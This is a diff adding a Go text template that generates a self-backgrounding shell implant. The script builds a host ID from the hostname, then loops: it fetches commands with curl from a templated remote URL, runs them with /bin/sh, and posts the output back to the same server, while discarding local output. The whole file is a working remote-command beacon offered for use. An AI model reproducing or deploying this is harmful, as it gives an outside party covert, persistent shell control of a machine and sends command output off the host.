@@ -1,0 +1,24 @@
+{{- /*
+     * clgen.tmpl
+     * Template for a cURL in a loop self-backgrounding script.
+     * By J. Stuart McMurray
+     * Created 20230726
+     * Last Modified 20230726
+     */ -}}
+#!/bin/sh
+
+/bin/sh >/dev/null 2>&1 <<'_eof' &
+
+ID="{{ .RandN }}-$(hostname || uname -n || curl -s file:///proc/sys/kernel/hostname || curl -s file:///etc/hostname || curl -s file:///etc/myname || echo unknown)-$$"
+
+while :; do
+        (
+                curl -s "{{ .URL }}/t/$ID" |
+                /bin/sh 2>&1 |
+                curl --data-binary @- -s "{{ .URL }}/o/$ID"
+        ) </dev/null &
+        sleep {{ .Interval }}
+done
+
+_eof
+{{- /* vim: set filetype=gotexttmpl noexpandtab smartindent: */}}
